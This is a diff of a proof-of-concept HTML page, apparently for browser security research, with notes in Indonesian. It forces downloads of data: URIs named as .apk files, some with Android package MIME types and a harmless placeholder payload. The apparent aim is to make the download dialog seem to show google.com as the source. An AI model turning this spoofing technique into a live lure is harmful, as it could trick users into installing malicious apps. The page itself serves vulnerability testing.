@@ -1,67 +1,95 @@
 <!doctype html>
 <html>
-<head><meta charset="utf-8"><title>PoC: data: variations</title>
-<style>
-  body{font-family:system-ui,Segoe UI,Roboto,Arial;margin:20px;max-width:900px}
-  button{margin:6px;padding:8px 12px}
-  pre{background:#f6f6f6;padding:10px;border-radius:6px}
-  .note{color:#444;font-size:0.95rem}
-</style>
+<head>
+  <meta charset="utf-8">
+  <title>PoC: data variations (fixed)</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <style>
+    body{font-family:system-ui,Segoe UI,Roboto,Arial;margin:20px;max-width:900px}
+    h2{margin-top:0}
+    button{margin:6px 6px 6px 0;padding:8px 12px;cursor:pointer}
+    pre{background:#f6f6f6;padding:10px;border-radius:6px;white-space:pre-wrap}
+    .note{color:#444;font-size:0.95rem}
+    .section{margin-top:12px}
+  </style>
 </head>
 <body>
-  <h2>PoC — data: variations (download dialog test)</h2>
-  <p class="note">Tes hanya di lingkungan pengujianmu. Klik tombol lalu perhatikan teks pada dialog download.</p>
+  <h2>PoC — data: variations (fixed)</h2>
+  <p class="note">Uji hanya di lingkungan pengujian. Klik tombol lalu perhatikan teks pada dialog download.</p>
 
-  <div>
-    <button onclick="dl('data: ,blank')">data: + space Tombol 1</button>
-    <button onclick="dl('data:text/plain,source%3A%20https%3A%2F%2Fgoogle.com')">data: URL-encoded 'https://google.com'  Tombol 2</button>
-    <button onclick="dl('data:text/plain,https://google.com,more')">data:https://google.com,more (naive)  Tombol 3</button>
+  <div class="section">
+    <button onclick="dl('data: ,blank')">Tombol 1 — data + Blank</button>
+    <button onclick="dl('data:text/plain,source%3A%20https%3A%2F%2Fgoogle.com')">Tombol 2 — data (URL-encoded contains https://google.com)</button>
+    <button onclick="dl('data:text/plain,https://google.com,more')">Tombol 3 — data:text/plain contains literal https://google.com</button>
   </div>
 
-  <div style="margin-top:8px">
+  <div class="section">
+    <button onclick="openWin()">Tombol 4 — Puf short base64</button>
+    <button onclick="openWin2()">Tombol 5 — Puf long base64 (no redirect)</button>
   </div>
 
-  <h3>Console / Info</h3>
-  <pre id="log">Ready. Klik tombol untuk membuat download.</pre>
+  <div class="section">
+    <h3>Console / Info</h3>
+    <pre id="log">Ready. Klik tombol untuk membuat download.</pre>
+  </div>
 
 <script>
-function log(s){ document.getElementById('log').textContent = s; }
-
-// helper to create anchor and force download
-function doAnchor(href, name){
-  log('Creating anchor:\\n href: ' + href + '\\n filename: ' + name);
-  const a = document.createElement('a');
-  a.href = href;
-  a.download = name;
-  document.body.appendChild(a);
-  a.click();
-  a.remove();
+function log(msg){
+  const p = document.getElementById('log');
+  p.textContent = msg;
 }
 
-// generic download wrapper
+/* Puf: create <a> anchor, set download & href, click, then remove */
+function Puf(uri, name) {
+  try {
+    const link = document.createElement("a");
+    link.download = name || '';
+    link.href = uri;
+    document.body.appendChild(link);
+    link.click();
+    setTimeout(()=> link.remove(), 50);
+    log('Puf() triggered:\n  href: ' + uri + '\n  download: ' + name);
+  } catch (e) {
+    log('Puf() error: ' + e);
+  }
+}
+
+/* Simple wrapper to create anchor and force download for non-Puf tests */
+function doAnchor(href, name){
+  const a = document.createElement('a');
+  a.href = href;
+  a.download = name || 'download';
+  document.body.appendChild(a);
+  a.click();
+  setTimeout(()=> a.remove(), 50);
+  log('Triggered download:\n  href: ' + href + '\n  download: ' + name);
+}
+
+/* Generic download wrapper used by Tombol 1-3 */
 function dl(href){
-  // choose filename visible to user
   const name = 'test-file.apk';
   doAnchor(href, name);
 }
 
-/* base64 variant */
-function dlBase64(){
-  const html = '<html><body>from https://google.com <a href="https://google.com">link</a></body></html>';
-  const b64 = btoa(unescape(encodeURIComponent(html)));
-  const uri = 'data:text/html;base64,' + b64;
-  doAnchor(uri, 'b64file.html');
+/* Tombol 4: use Puf with a short base64 data:apk, no redirect */
+function openWin(){
+  const uri = "data:application/vnd.android.package-archive;base64,UGVhY2UgQmUgVXBvbiBZb3U=";
+  const name = "Testing.apk";
+  Puf(uri, name);
 }
 
-/* blob variant */
-function dlBlob(){
-  const html = '<html><body>blob content => from https://google.com</body></html>';
-  const blob = new Blob([html], { type: 'text/html' });
-  const url = URL.createObjectURL(blob);
-  doAnchor(url, 'from-blob.html');
-  // revoke after a bit
-  setTimeout(()=>{ URL.revokeObjectURL(url); log('Revoked object URL: ' + url); }, 5000);
+/* Tombol 5: use Puf with long base64 (repeated) and do NOT redirect */
+function openWin2(){
+  const longB64 = "data:application/vnd.android.package-archive;base64," +
+    "UGVhY2UgQmUgVXBvbiBZb3U=UGVhY2UgQmUgVXBvbiBZb3U=UGVhY2UgQmUgVXBvbiBZb3U=" +
+    "UGVhY2UgQmUgVXBvbiBZb3U=UGVhY2UgQmUgVXBvbiBZb3U=UGVhY2UgQmUgVXBvbiBZb3U=";
+  const name = "Testing-long.apk";
+  Puf(longB64, name);
 }
+
 </script>
+
+<center style="margin-top:18px"><h2>Rebelsec</h2></center>
+
 </body>
 </html>
